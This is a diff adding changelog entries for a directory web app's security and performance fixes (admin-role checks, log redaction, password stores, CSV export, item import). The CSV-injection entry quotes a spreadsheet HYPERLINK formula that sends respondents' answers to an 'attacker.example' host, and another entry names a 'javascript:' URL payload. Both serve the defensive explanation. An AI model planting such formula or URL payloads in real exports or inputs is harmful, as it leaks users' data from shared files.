@@ -7,8 +7,96 @@ sidebar_position: 99
 
 # Documentation & Specs Change Log
 
+## 2026-11-18
+
+- `apps/web/lib/content.ts` `apps/web/components/{errors/not-found-content,layout/document-shell,providers/navigation-provider,shared-card/index,home-two/home-two-layout}.tsx` `apps/web/app/[locale]/(listing)/**` `apps/web/app/[locale]/categories/[category]/page.tsx` `apps/web/app/unauthorized/page.tsx` `apps/web/next.config.ts` `apps/web/lib/payment/**` `apps/web/lib/services/{webhook-subscription,moderation,item-import}.service.ts` `apps/web/app/api/{admin/reports/[id],version/sync,stripe/subscription,items/[slug]/comments/[commentId]}/route.ts` `apps/web/lib/{listing-server,utils/csv-formula,validations/item-import,db/queries/newsletter.queries}.ts` `apps/web/public/openapi.json` `docs/features/voting-comments*.md` (+ 12 locales) Release review of #1151 (develop → stage), [`061-shared-item-parse-cache`](spec/061-shared-item-parse-cache/spec.md) and the fixes it carries: a single-item read fails on IO errors instead of caching a 404; content that MDX cannot compile (a `<75%`, a stray `{`) renders as Markdown, then as text, instead of failing the cached page with a 500 (seen on demodev after the `:dev` roll); the localized 404 is translated (`help.*` messages); `/unauthorized` has no locale-cookie redirect (there is no `/<locale>/unauthorized`); filtered listings keep their query in server-rendered page links; `NEXT_CACHE_MAX_MEMORY_MB` rejects non-finite values; LemonSqueezy amounts honour zero-decimal currencies and a paid invoice writes its currency; verified-email matching ignores case; Stripe subscription PUT/DELETE accept the owner's own Stripe customer before the webhook row exists; admin report PUT validates the whole body before acting; CSV formula escaping covers a leading line feed; `@next/env` follows `next` 16.4.5; collection and listing sorts tolerate non-string names; resubscribing resets `subscribedAt`; removing content always writes an item audit row; comment API docs say `:slug` and never list `email`. (#1152)
+
+- `apps/web/app/[locale]/admin/clients/[id]/page.tsx` `apps/web/lib/auth/guards.ts` `docs/architecture/auth-utilities-module.md` [`009-admin-dashboard`](spec/009-admin-dashboard/spec.md): the admin client detail page authorized on the session's `isAdmin` claim, which `lib/auth/index.ts` sets only at sign-in and which stays for the JWT's 30-day lifetime, and then loaded the client's profile (email, phone, location), last login, portfolio and stats on the server. A user whose admin role was removed while signed in could still open `/admin/clients/{id}` for any client until the token expired; the client-side admin layout reads the same claim and runs after the data is already in the page payload. The page now awaits `isAdmin(session.user.id)` (`lib/db/roles.ts`) before any client query: signed out still goes to sign-in, a session whose admin role was removed is redirected to `/unauthorized` (before, it got the data), and a failed lookup throws to the error page. A session without the claim never reaches the page: `proxy.ts` sends it to admin sign-in first. `requireAdmin()` and `checkIsAdmin()` in `lib/auth/guards.ts` read the claim too (`checkIsAdmin()` gates the three dashboard survey pages); both now use the live role through a helper that treats a missing user id or a failed lookup as not admin. Spec 009 records this as AC-7 (live admin role, fail closed) and task T-011, and its index row says so; no new route, API or contract. Source guard `apps/web/lib/auth/__tests__/admin-claim-pages.spec.ts` (12 tests; 11 fail on the old code) and Playwright spec `apps/web-e2e/tests/admin/admin-client-detail-live-role.spec.ts` (a signed-in client ends on `/unauthorized`; it stops at the proxy before the new check and passes on the old code too). T-2637 (#1148)
+
+- `apps/web/lib/db/queries/user.queries.ts` `apps/web/lib/auth/index.ts` `apps/web/lib/newsletter/utils.ts` `apps/web/app/[locale]/{newsletter,auth}/actions.ts` `apps/web/lib/payment/services/payment-email.service.ts` `apps/web/lib/mail/{index,mock,smtp}.ts` `apps/web/lib/mail/templates/example-usage.ts` `apps/web/lib/services/subscription-jobs.ts` `apps/web/app/api/geocode/route.ts` `apps/web/app/api/auth/change-password/route.ts` `apps/web/lib/payment/lib/providers/{stripe,polar,lemonsqueezy,solidgate}-provider.ts` `apps/web/lib/utils.ts` `docs/services/newsletter-service.md` `docs/architecture/newsletter-library.md`: server logs held email addresses. `getUserByEmail` logged the typed address on every failed sign-in, the OAuth jwt callback logged it when it created a client profile, sign-up logged it when the verification email went out, `sendEmailSafely` (newsletter and every payment email) and the newsletter action logged the recipient, the renewal reminder job and both geocode audit logs logged the user's email, and the password-change email logged `templateData` (address, name, IP address and user agent), the recipient and the provider result (Nodemailer's holds the recipient in `accepted` and `envelope.to`), which the change-password route logged again. The four payment providers logged the address when they created a customer on the first checkout (their `logger.debug` is a plain `console.log`) and the whole customer data when that failed, and the LemonSqueezy plan change logged the whole subscription response (address, name, card brand and last four digits). The payment success log also passed the whole `PaymentEmailData`: name, email, amount, transaction id and receipt URL. Each message now names an id (client profile, user) or the email context (template subject, `payment success`, ...) instead; `logNewsletterActivity` logs `hasEmail`, and the mock and Ethereal `To:` boxes show `maskEmail()`, which now hides at least one character of short names too. Whole webhook objects logged by `webhook-dispatch`, the Solidgate webhook and `webhook-subscription.service` are left for a follow-up. Source guard `lib/__tests__/email-logging.spec.ts` reads `console.*` and `logger.*` calls, counts a spread (`...data`) as logging the object whole, and tests `maskEmail` (55 tests over 17 files; 25 fail on the old code). Polar's invalid-email message no longer names the rejected address (nor falls back to the raw 422 body), and the change-password route logs a confirmation email the mail helper skipped (no email service) as skipped instead of sent; `lib/__tests__/email-logging-outcomes.spec.ts` loads both with stubbed imports and checks the console (6 tests; 5 fail on the old code). T-2638 (#1149)
+
+- `apps/web/lib/db/queries/user.queries.ts` `apps/web/app/[locale]/auth/actions.ts` `apps/web/app/api/auth/change-password/route.ts` `docs/database/{users-queries-deep-dive,admin-queries}.md` `docs/plugins/auth-change-password{,-body}-spec.md` `spec-031`: the danger-zone forms checked the password with `verifyClientPassword(...) || comparePasswords(password, dbUser.passwordHash)` (`deleteAccount` and `deactivateAccount`), so a match in either password store passed, while sign-in (`lib/auth/credentials.ts`) checks an admin only against `users.passwordHash` and everyone else only against the credentials account hash. Before #1140, resets and changes wrote `users.passwordHash` only, so deployed databases still hold stale hashes in the other store: a seeded admin who changed the seed password keeps the seed hash on their credentials row, and anyone holding that admin's session could hard-delete or deactivate the account with the old default password (the same for a client whose old reset left a hash on `users`). The change-password route already picked one hash (T-2564); that choice moved into the new `getSignInPasswordHash(user)`, which returns `users.passwordHash` for an admin that has one and the credentials account hash otherwise (`users.passwordHash` when there is no credentials account hash, as the route did; `null` when the user has neither), and fails closed: a missing tenant or a failed role lookup (`isUserAdminOrThrow`) throws instead of reading as "not an admin". `deleteAccount`, `deactivateAccount` and `POST /api/auth/change-password` check against it (the route's responses are unchanged; it answers the OAuth 400 when the helper returns `null`). The uncalled `updatePassword` action checked `users.passwordHash` and wrote it with `updateUserPassword`; it now checks the helper's hash and writes through `setUserPasswordHash`. Spec 031's password-verifier note records the new check. No new route, surface, API or schema change. Unit spec `lib/db/queries/__tests__/password-store.spec.ts` (14 source guards: 7 new, 2 of the route guards rewritten for the helper; 9 fail on the old code). T-2639 (#1150).
+
+## 2026-11-17
+
+- `apps/web/lib/{content,item-file-cache,content-revision,config-manager,cache-invalidation}.ts` `apps/web/lib/services/sync-service.ts` `apps/web/app/layout.tsx` `apps/web/app/[locale]/**` `apps/web/components/{layout/document-shell,ai/AiChatMount,ai/ChatLauncher,providers/navigation-provider,shared-card/index}.tsx` `apps/web/lib/query-client.ts` `apps/web/cache-handler.cjs` `apps/web/next.config.ts` `docs/performance/{content-loading,cdn-cacheability}.md` `docs/architecture/cache-system.md` [`061-shared-item-parse-cache`](spec/061-shared-item-parse-cache/spec.md): public directory pages are now cached (ISR) and CDN-cacheable in every locale. Localized item pages took 5–12 s on a 4,105-item, 21-locale site under crawler load (`mcpserver.ever.works`), and sites on the 2 GiB `k8s-works` cluster were OOM-killed. Every public page rendered per request: the root layout read the locale with `getLocale()` before `[locale]/layout.tsx` set it, `AiChatMount` read `cookies()` and the session, no page called `setRequestLocale`, dynamic segments had no `generateStaticParams`, and the item page resolved the comments' tenant from the session and headers. The document shell (`<html lang dir>`) moved to `[locale]/layout.tsx`; public pages call `setRequestLocale`; the chat launcher resolves auth in the browser; `NavigationProvider`'s `useSearchParams()` sits behind its own Suspense boundary; item and tag pages are ISR for every slug; plain home/discover/category URLs are rewritten to cached twins (filtered ones still render per request); per-visitor segments and the index grids are pinned to `force-dynamic`. The runtime page cache stays in memory through `apps/web/cache-handler.cjs`, Next's own cache handler without disk writes (`NEXT_CACHE_MAX_MEMORY_MB`, default 64; `NEXT_ISR_FLUSH_TO_DISK=true` writes pages to disk); `experimental.isrFlushToDisk` keeps its default, as turning it off also turns off the optimized-image disk cache. Memory: during SSR every `useQuery` scheduled a TanStack Query garbage-collection timer (5 minutes to a day), and each timer kept its request's whole async context (render streams, RSC payload) alive until it fired, so the heap grew by gigabytes under crawler load on every site built from the template; the server now schedules no TanStack timer of 60 s or more and its query client's `gcTime` is `Infinity`. Item YAML is parsed once per file version and shared by every locale and option set (it was re-parsed per locale, ~3.5 s each, up to 42 walks); collection YAML and `works.yml` (re-parsed ~20 times per render) likewise; content caches live on `globalThis` (Next.js loaded `lib/content.ts` once per runtime, so the sync's clear never reached the page caches) and the per-locale listing cache is LRU-bounded. The sync invalidates only when the checkout's HEAD moved (or hourly), always clears the in-memory caches then and retries cache tags its timer could not revalidate (render phase, no request), re-walks the default locale in the background, and rebuilds the location index per commit; the missing-YAML repair runs once per distinct set. `getCachedConfig` is keyed by the content revision with a 10-minute TTL (its 60 s TTL capped every cached page's `s-maxage`); localized 404s render in the locale layout (`[locale]/not-found.tsx`); direct requests for the twin paths answer 404. The tags pages no longer count every tag twice. Local production build, same data and script, before → after: warm item page 131/111 ms → 33/24 ms (en/de), home 142/155 → 33/34 ms, category 176/187 → 31/31 ms, tag (6.3 MB) 870/1,010 → 155/168 ms; first German item request 4,012 → 353 ms; 210 new item URLs at 4 concurrent 84.7 s (p99 18.7 s) → 37.8 s (p99 1.55 s), repeated 15.9 s → 2.9 s; RSS/heap after both crawls 1,221/914 → 800/523 MB. Sync under load (prod-like checkout before the 106-item merge, 9 minutes of crawler load over 21 locales, the regular sync pulls the merge mid-load): peak RSS 4,603 → 1,160 MB, live after GC 4,277 → 509 MB, a 17 s stall and +~800 MB at the sync → none. Review fixes: a failed item read errors instead of answering 404, so a failed regeneration keeps the last good page (a malformed slug is still a 404); localized 404 links keep the locale; a repair whose pull was skipped or failed is retried; concurrent walks share only a walk of the same directory version; a location index rebuild that read no items is retried; adding a tenant marks cached item pages stale (they may embed the previous single tenant's comments), and `TENANT_ID` alone no longer puts a tenant's comments in shared HTML while other tenant rows exist (signed-in visitors resolve to their session's tenant); the comments hook cancels its mount refetch before writing a new or edited comment, then reloads the list; infinite scroll reads the query from the URL when it fetches. Unit specs `lib/__tests__/item-file-cache.spec.ts` (12), `content-revision.spec.ts` (6), `cacheable-public-pages.spec.ts` (10), `page-cache-handler.spec.ts` (3; the one JavaScript file, recorded as an Article II exception in `docs/architecture/cache-system.md`), `lib/auth/__tests__/shared-render-tenant.spec.ts` (8). (#1146)
+
+- `apps/web/lib/utils/{csv-formula,survey-responses-csv}.ts` `apps/web/components/surveys/utils/survey-helpers.ts` `apps/web/lib/services/{analytics-export,item-export}.service.ts` `docs/components/survey-components.md` `docs/services/{analytics-services,analytics-service-deep-dive}.md`: anyone can answer a published survey (`POST /api/surveys/{surveyId}/responses`) with any JSON object, keys and values, and the admin "Export CSV" button wrote them with `exportResponsesToCSV`, which quoted cells but never neutralised a leading `=`, `+`, `-`, `@`, tab or CR. An answer such as `=HYPERLINK("https://attacker.example/?"&A2,"Open")` ran as a formula when the admin opened the file in a spreadsheet app and could send other respondents' answers to another site; an answer key did the same in the header row. `AnalyticsExportService`'s two `esc` functions had the same gap. `CSV_FORMULA_PREFIX` moved from `item-export.service.ts` to the new `lib/utils/csv-formula.ts`, next to `escapeCsvFormula`, which prefixes `'` when it matches (plain numbers such as `-12.5` stay unchanged, as in the item export). The new `buildSurveyResponsesCsv` (`lib/utils/survey-responses-csv.ts`) builds the survey CSV text and escapes header and data cells before quoting, so `exportResponsesToCSV` keeps only the BOM and the download; both analytics `esc` functions use the helper. Guarded by `apps/web/lib/utils/__tests__/{csv-formula,survey-responses-csv}.spec.ts` and `apps/web/lib/services/__tests__/analytics-export-csv.spec.ts` (22 tests: on develop the two `lib/utils` files cannot load and both analytics tests fail; with the escaping turned off, the 14 non-control tests fail). No spec: a security fix inside existing CSV export code, with no new route, surface, API, contract or schema change, and the CSV columns are unchanged. T-2608 (#1142)
+
+- `apps/web/lib/services/item-import.service.ts` `apps/web/lib/validations/{http-url,item-import,client-item}.ts` `docs/plugins/client-items-import-method-spec.md` `docs/architecture/validation-schemas.md` `spec-058`: the CSV/XLSX item import (`POST /api/client/items/import` for any signed-in user, and the admin import) compared links as exact strings, while `POST /api/client/items` refuses a known link with 409 by its `normalizeSourceUrl` key (http vs https, host case, `www.`, trailing slash, fragment and tracking parameters ignored). A row with `https://www.example.com/tool/` for an existing `https://example.com/tool`, or two rows of one file with the same link and different names, were all created as duplicates (pending ones from a client import). `validateRows` and `executeImport` now key the existing items' links (deleted ones included, as before) with `normalizeSourceUrl` and also remember the links of earlier rows of the file that are created or updated: the preview flags such a row as a duplicate and the import skips it (review fix: a row skipped for its existing slug claims no link, so a later row with that free link is still created). With the admin update strategy the preview now says a link-only duplicate "will be skipped", as the import does (only an item with the row's slug is updated). `source_url` was `z.string().url()`, which accepts `javascript:alert(1)` and `data:` links, and `normalizeSourceUrl` returns null for those, so no link check applied to them; the new shared `httpUrlSchema` (`lib/validations/http-url.ts`, http and https only, same `Invalid URL format` message) is used by `importRowSchema`, `importRowDataSchema`, `clientCreateItemSchema` and `clientUpdateItemSchema`. A bug fix inside the existing import with no new route, but it tightens the existing input contract: a `source_url` with any scheme other than http or https (for example `javascript:` or `data:`), accepted before, now fails validation with `Invalid URL format` on the import rows, `POST /api/client/items` and `PUT /api/client/items/[id]`; spec 058's out-of-scope note and tasks record that the import now compares links the same way. Unit specs `lib/services/__tests__/item-import-execute.spec.ts` (9 new tests, 7 fail on the old code) and `lib/validations/__tests__/source-url-scheme.spec.ts` (9 tests, 4 fail on the old code). T-2610 (#1144)
+
+- `apps/web/lib/services/item-git.service.ts` `apps/web/app/api/admin/items/route.ts` `apps/web/app/api/client/items/route.ts` `docs/plugins/{admin-items-create-body,client-items-method}-spec.md`: `ItemGitService.createItem` (the submit form and `POST /api/admin/items`) read every item, checked the id and slug, then wrote `data/<slug>/<slug>.yml` with `w`. A CSV import or an admin create that wrote the same slug during that read was replaced: both requests reported success and the first item, submitter included, was gone (the submission lock covers `createAsClient` calls only). `createItem` now writes with `wx`, as `createItemWithoutCommit` does since T-2527, and turns `EEXIST` into the new `DuplicateItemError` ("Item with slug '<slug>' already exists"), leaving the other file untouched and committing nothing; the id and slug checks after the read throw the same class (the id check too, because a client item's id is its slug). Both POST routes answer it with 409 instead of 500. Unit spec `apps/web/lib/services/__tests__/item-create-exclusive.spec.ts` (5 of its 6 tests fail on the old code). T-2609 (#1143)
+
+- `apps/web/components/item-detail/comments-section.tsx` `apps/web/messages/*.json`: more of the item page was English in the other locale files. `common.COMMENTS` (the comments heading), `itemDetail.INFORMATION` (the Information block heading in `components/item-detail/item-detail.tsx`) and `itemDetail.PUBLISHER` were "Comments", "Information" and "Publisher" in hi, it, ja, nl, pl, pt, th and uk, and the vote stat `itemDetail.STATS_VOTES` (`components/item-detail/item-stats-section.tsx`) was "Upvotes" in de and nl: 26 values, all translated now. The profile button on a comment's author card had a hard-coded `title="View profile"` and "Profile" text in every locale; it now reads the new `itemDetail.COMMENTS_VIEW_PROFILE` and `itemDetail.COMMENTS_PROFILE` keys, added to all 21 files. Trivial-fix exception (no spec). Unit spec `apps/web/lib/__tests__/item-detail-i18n.spec.ts` now covers these keys and the two literals (3 of its 5 tests fail on the old code). T-2611 (#1145)
+
+- `apps/web/lib/db/queries/user.queries.ts` `apps/web/app/[locale]/auth/actions.ts` `apps/web/app/api/auth/change-password/route.ts` `docs/database/{users-queries-deep-dive,admin-queries}.md` `docs/plugins/auth-change-password{,-body}-spec.md`: password reset and change-password wrote the new hash to `users.passwordHash`, but client sign-in (`verifyClientPassword`) reads only the hash on the user's `credentials` row in `accounts`, where signup puts it. A client who reset their password saw success, the new password was then rejected and the old one still signed in, so a reset after a compromise did not lock the attacker out; every credentials client who submitted the change-password form got the 400 "Password change not available for OAuth accounts", because their users row has no hash. Admins were not affected (their hash lives on `users`). New `setUserPasswordHash(userId, hash)` updates, in one transaction, the `credentials` account of the user in the current tenant and `users.passwordHash` where it is already set, or where the user has no credentials account (as before, so an admin who signed up through OAuth can still set a password with a reset). `newPasswordAction` writes through it; `POST /api/auth/change-password` checks the current password (and the same-password rule) against the hash sign-in accepts for the user, `users.passwordHash` for an admin that has one and the credentials account hash otherwise (falling back to `users.passwordHash` when there is no credentials account hash, for route compatibility only: sign-in does not read it for a non-admin), so a stale hash in the other store (the seed password on a seeded admin's credentials row after an earlier change wrote `users` only) cannot authorize a change (review fix; the role lookup, `isUserAdminOrThrow`, fails closed with a 500 instead of reading a database error as "not an admin"), answers the OAuth 400 only when neither hash exists, and writes through the helper. Unit spec `lib/db/queries/__tests__/password-store.spec.ts` (7 source guards; the first 6 fail on the old code). T-2564 (#1140).
+
+- `apps/web/app/api/surveys/{route,[surveyId]/route,[surveyId]/responses/route,responses/[responseId]/route}.ts` `apps/web/app/api/items/[slug]/company/route.ts` `apps/web/app/api/geocode/route.ts` `apps/web/public/openapi.json` `docs/api/{survey-endpoints,survey-endpoints-deep-dive,geocode-endpoints,items-api-endpoints-deep-dive}.md`: these handlers authorized on the session's `isAdmin` claim, which `lib/auth/index.ts` sets only at sign-in and which `lib/auth/admin-guard.ts` notes stays true for the JWT's 30-day lifetime, so an admin whose role was removed (or whose user was deleted) could still create, edit and delete surveys, read draft surveys and every survey response, change item company links and spend the geocoding quota until the token expired, while every `/api/admin/*` route already refused them. Survey `POST`/`PUT`/`DELETE`, both survey-response reads and item-company `GET`/`POST`/`DELETE` now return `checkAdminAuth()`'s response, and `POST /api/geocode` uses `requireAdminSession()`: both check the role in the database, so the caller gets 401 when signed out and 403 when signed in without the admin role (it was 401 for both on the survey and item-company routes; geocode's 403 body is now `Forbidden`). `GET /api/surveys` and the unpublished-survey read in `GET /api/surveys/{surveyId}` take the admin flag from `isAdmin(session.user.id)` (`lib/db/roles.ts`); non-admins still only get published surveys (T-2529). Guarded by `apps/web/lib/auth/__tests__/admin-claim-routes.spec.ts` (24 tests: the 23 route checks fail on the old code, and the admin-only checks require the guard's refusal to be returned before anything else is awaited); the source check in `apps/web/lib/__tests__/surveys-list-visibility.spec.ts` now expects the live role. T-2566 (#1141)
+
+- `apps/web/app/[locale]/newsletter/actions.ts` `docs/api/newsletter-endpoints.md`: a visitor who unsubscribed at `/newsletter/unsubscribe` could never subscribe again from the footer form. Unsubscribing keeps the `newsletterSubscriptions` row (only `isActive` became `false`) and `email` is unique, but `subscribeToNewsletter` only refused an active row and then always inserted a new one; `createNewsletterSubscription` caught the unique violation and returned null, so the form answered "Failed to create subscription. Please try again." every time. `subscribeToNewsletter` now re-activates an existing inactive row with the (until now unused) `resubscribeToNewsletter` query, which also clears `unsubscribedAt`, creates a row only for an email that has none, and sends the welcome email in both cases. The unsubscribe action now calls the `unsubscribeFromNewsletter` query (imported as `unsubscribeFromNewsletterQuery`, since the action has the same name), so `unsubscribedAt` is recorded. The `console.log` that wrote every subscriber's email to the server log is gone. The unique constraint and the schema are unchanged. Not fixed here (follow-up): `email` is unique across all tenants while every newsletter query also filters by `tenantId`, so an address that already has a row under another tenant still gets "Failed to create subscription". No spec: a bug fix inside two existing server actions, with no new route, surface, API, contract or schema change; the behaviour is documented in `docs/api/newsletter-endpoints.md`. Source guard `apps/web/lib/db/queries/__tests__/newsletter-resubscribe.spec.ts` (6 tests, all 6 fail on the old code). T-2567 (#1139).
+
+- `apps/web/lib/auth/{index,credentials}.ts` `docs/api/auth-endpoints.md`: the NextAuth `signIn` callback ran `console.log('Sign-in attempt', { user, account, profile })` on every sign-in in every environment. For OAuth, `account` holds the provider's access, refresh and id tokens and `profile` the provider profile; for an admin credentials sign-in, `user` was the whole `users` row, because the admin branch of `authorize` returned `{ ...foundUser, ... }` from `getUserByEmail` (`select()` of every column), so the bcrypt `passwordHash` reached the logs too. The OAuth line also logged the email. The sign-in log now runs only when `coreConfig.NODE_ENV === 'development'` and logs only `provider`, `hasUserId` and `hasEmail`; the OAuth line logs the provider only. The admin branch returns `id`, `email`, `image`, `tenantId`, `isClient` and `isAdmin` instead of the row; the jwt callback reads nothing else from `user` (it loads `tenantId` and `deactivatedAt` from the database), and `users` has no name column, so `name` stays unset as before. Source guard `lib/auth/__tests__/signin-logging.spec.ts` (8 tests; 6 fail on the old code; it also rejects token and bracket field reads in any sign-in log). T-2565 (#1138)
+
+## 2026-11-16
+
+- `apps/web/messages/*.json`: the item page's rating label and comment strings were English in the other locale files. `itemDetail.RATING` was "Rating" in 13 of them (ar, de, es, he, hi, it, ja, nl, pl, pt, th, uk, zh); it heads the rating block (`components/item-detail/rating-display.tsx`), labels the rating in the comment form and names the star picker for screen readers (`components/ui/rating.tsx`). The 17 `itemDetail.COMMENTS_*` keys of `components/item-detail/comments-section.tsx` (comment box placeholder, keyboard hint, Post/Posting/Saving/Deleting, delete dialog, sign-in prompt, empty state and the six toasts) were English in all 20 files. All are translated now (353 lines; `COMMENTS_SHORTCUT` keeps "Cmd/Ctrl + Enter"). `i18n/request.ts` merges en.json under each locale, so nothing failed before. Trivial-fix exception (no spec). Unit spec `apps/web/lib/__tests__/item-detail-i18n.spec.ts` reads each locale file on its own (its translation test fails on the old files with 353 untranslated entries). T-2561 (#1136)
+
+- `apps/web/lib/services/{moderation.service,moderation-content-owner}.ts` `apps/web/app/api/admin/reports/[id]/route.ts` `docs/api/{reports,moderation}-endpoints.md` `docs/plugins/admin-reports-id-method-spec.md`: warn, suspend and ban on an item report never reached the submitter. `getContentOwner` returned the item's `submitted_by`, which is a `users.id`, but `warnUser` / `suspendUser` / `banUser` look the target up by `client_profiles.id` (its own random UUID), so each of them failed with `User not found`; `PUT /api/admin/reports/{id}` had already saved the report, only logged the failure and answered `success: true`, so the admin saw "Report updated successfully". A removed item's `moderation_history` row (which references `client_profiles.id`) broke its foreign key too, so the delete had no audit row. New pure `resolveItemOwnerProfileId` maps `submitted_by` to the submitter's client profile with `getClientProfileByUserId` and fails with `Item submitter has no client profile` for `'anonymous'` / `'import'` / `'admin'`; the route now runs the moderation action before `updateReport` and, when it fails, answers 409 (target already suspended or banned, or gone) or 500 with the action's message and leaves the report unchanged (the admin reports page already shows that message in its error toast and keeps the dialog open). A resolution the report already has is not run again, because the review dialog sends it back with every edit and a repeated ban, suspension or item removal would fail and block note or status edits on a completed report. Comment reports were not affected. Swagger, the API and service docs and the per-route spec doc describe the new order and statuses. Unit spec `lib/services/__tests__/moderation-content-owner.spec.ts` (6 tests; the file cannot load on the old code, and its 3 source guards fail with the helper alone). T-2528 (#1134).
+
+- `apps/web/lib/services/survey-list-filters.ts` (new) `apps/web/app/api/surveys/route.ts` `apps/web/public/openapi.json` `docs/api/survey-endpoints{,-deep-dive}.md`: `GET /api/surveys` needs no session and answers each survey with its full `surveyJson` and response count, but it never checked the role and passed the `status` query parameter straight through, so a signed-out `GET /api/surveys?status=draft` (or one with no `status` at all) listed draft and closed surveys with all their questions, while `GET /api/surveys/{surveyId}` answers 404 for the same surveys unless the caller is an admin. The filters now come from the new `buildSurveyListFilters(searchParams, isAdmin)`, called with `!!session?.user?.isAdmin`: a non-admin always gets `status: published`, whatever the query says; an admin keeps the requested status, or every status when none is sent (the admin survey list). `type` and `status` must be a `SurveyTypeEnum` / `SurveyStatusEnum` value, and anything else is ignored instead of being cast and passed to the query; page and limit parsing is unchanged. The route's OpenAPI comment and `openapi.json` say so. The public callers (item CTA button, item survey section, `/api/surveys/exists`) already asked for published surveys. Item owners' `/dashboard/items/{itemId}/surveys` list (which sends no status) now shows only published surveys for a non-admin, matching what the detail endpoint already let them open. Guarded by `apps/web/lib/__tests__/surveys-list-visibility.spec.ts`. T-2529 (#1133)
+
+- `apps/web/lib/services/{item-export,item-import}.service.ts` `docs/plugins/admin-items-export-query-spec.md`: the item CSV export (`GET /api/admin/items/export` and the public `GET /api/items/export`) wrote client-submitted text as-is, so an item name or description starting with `=`, `+`, `-` or `@` ran as a formula when an admin opened the file in a spreadsheet app. `ItemExportService.exportToCSV` now passes `escapeFormulae` to `Papa.unparse` (as the payment report export does) with a pattern that checks the first character only, because Papa's `true` pattern skips values with a line break and a multi-line description starting with `=` got through; plain numbers such as a negative latitude are left unchanged. `ItemImportService.parseCSV` removes that one leading `'` again, so an exported CSV imports back unchanged. The XLSX export writes string cells and was not affected. Unit spec `lib/services/__tests__/item-export-csv.spec.ts` (9 tests; 5 fail on the old code). T-2530 (#1135).
+
+- `apps/web/lib/services/item-import.service.ts` `apps/web/lib/validations/item-import.ts` `apps/web/app/api/client/items/import/route.ts` `docs/plugins/client-items-import-method-spec.md`: `POST /api/client/items/import` (any signed-in user) passed `body.rows` straight to `executeImport`, which trusted each row's `valid` and `duplicate` flags and its data. A row marked valid, with no duplicate flag and the slug of an existing item, overwrote that item's YAML (the item became pending, so it left the site, and the caller became its submitter); slug `../x` wrote outside `data/` in the content repo; and the row could set `featured`, `collections`, `brand_logo_url` and `images`. `executeImport` now checks every row again against the new `importRowDataSchema` (name, description and URL rules of `importRowSchema`; slug must match `/^[a-z0-9]+(?:-[a-z0-9]+)*$/`) and reports a failing row as an error; it works out duplicates itself from `findAll({ includeDeleted: true })` by slug and `source_url`, so a row whose slug exists never reaches `batchCreate` (skipped, or updated by the existing item's id only with the admin `'update'` strategy), and a slug that appears twice in the rows it receives is an error (the preview still renames a repeated slug, e.g. `same` then `same-2`, so a normal import creates both rows). A new `clientMode` option, passed by the client route, forces `featured` to `false`, drops `collections`, `brand_logo_url` and `images` (as `clientCreateItemSchema` does) and never updates an existing item. `importRowSchema` gets the same slug rule (an empty slug cell still means "make one from the name"), and `validateRows` counts deleted items as duplicates and flags a slug made from the name that the rule refuses (e.g. one with `_`), so the preview matches what the import does. The lookup is a snapshot, so `ItemGitService.createItemWithoutCommit` (`apps/web/lib/services/item-git.service.ts`) now writes with `wx`: a slug that an overlapping import or submission takes after the lookup fails with `EEXIST`, `ItemRepository.batchCreate` (`apps/web/lib/repositories/item.repository.ts`) leaves that row out (and does not commit when nothing was written), and `executeImport` counts it as skipped instead of replacing the other item's YAML. Unit specs `apps/web/lib/services/__tests__/item-import-execute.spec.ts` (14 of its 17 tests fail on the old code) and `apps/web/lib/services/__tests__/item-import-exclusive-create.spec.ts` (4 of 4 fail without the `wx` write). T-2527 (#1132)
+
+- `apps/web/lib/validations/comment.ts` `apps/web/app/api/items/[slug]/comments/{route.ts,[commentId]/route.ts}` `docs/api/comment-endpoints.md` `docs/plugins/item-comments-create-body-spec.md`: `POST /api/items/{slug}/comments` only checked `content?.trim()` and a numeric rating in 1-5, so a rating of `3.5` reached the integer `comments.rating` column (500), a numeric `content` threw a `TypeError` (500), a malformed JSON body answered 500, and a direct API call could store content of any length (the textarea caps at 1000, the API did not). New `validateCommentInput` requires content to be a string of 1-1000 characters after trim and rating an integer from 1 to 5, and returns the trimmed values or a 400 message (content with a NUL character is refused too, since Postgres `text` cannot store it); POST parses JSON in its own try/catch (400 `'Invalid JSON body'`), calls it and stores the trimmed content; the comment `PUT` calls the same helper with `{ partial: true }` so create and edit cannot drift (its messages are unchanged except that a `null` field reads "... is required", and a non-object or malformed JSON body is a 400 instead of a 500). Swagger, the API reference and the per-route spec doc list the new 400 cases. Unit spec `lib/validations/__tests__/comment.spec.ts` (16 tests; the file cannot load on the old code, and its 4 route guards fail with the helper alone). T-2502 (#1130).
+
+- `apps/web/components/ui/rating.tsx` `apps/web/messages/*.json`: a read-only star rating (each review, and the item's average) was five disabled radio buttons named "Rate 1 star" to "Rate 5 stars", and none was checked for a fractional average, so a screen reader never said the rating. It is now one `role="img"` named by the new `common.RATED_OUT_OF` key ("Rated 4.3 out of 5", rounded to one decimal, locale number format), with `aria-hidden` stars. The interactive picker keeps its radiogroup, named by `itemDetail.RATING`, and names each star with the new `common.RATE_STARS` ICU plural instead of English. Both keys are in all 21 locale files, translated. `focus:outline-hidden focus:ring-none` became `focus-visible:ring-2 focus-visible:ring-yellow-400`, so keyboard focus shows, and the click `console.log` is gone. Trivial-fix exception (no spec). Unit spec `apps/web/lib/__tests__/rating-a11y.spec.ts` (#1131).
+
+- `apps/web/app/api/version/sync/route.ts`, `docs/api/version-sync-endpoints.md`, `docs/api/internal-endpoints.md`: `POST /api/version/sync` only checked that the caller was signed in, so any registered user (including one who had just signed up) could trigger syncs in a loop; each successful run pulls the data repository, flushes every content cache and (when location features are on) rebuilds the location index, slowing pages for all visitors and keeping the git provider busy. The handler now calls `requireAdminSession()` from `@/lib/auth/admin-guard` before `triggerManualSync()`: anonymous callers get 401 and signed-in non-admins get 403 (role read from the database). `GET /api/version/sync` (status only) stays public. The route's OpenAPI comment lists 401 and 403, and the API docs say the sync trigger needs an admin. Guarded by `apps/web/lib/__tests__/version-sync-admin.spec.ts`. T-2501 (#1129)
+
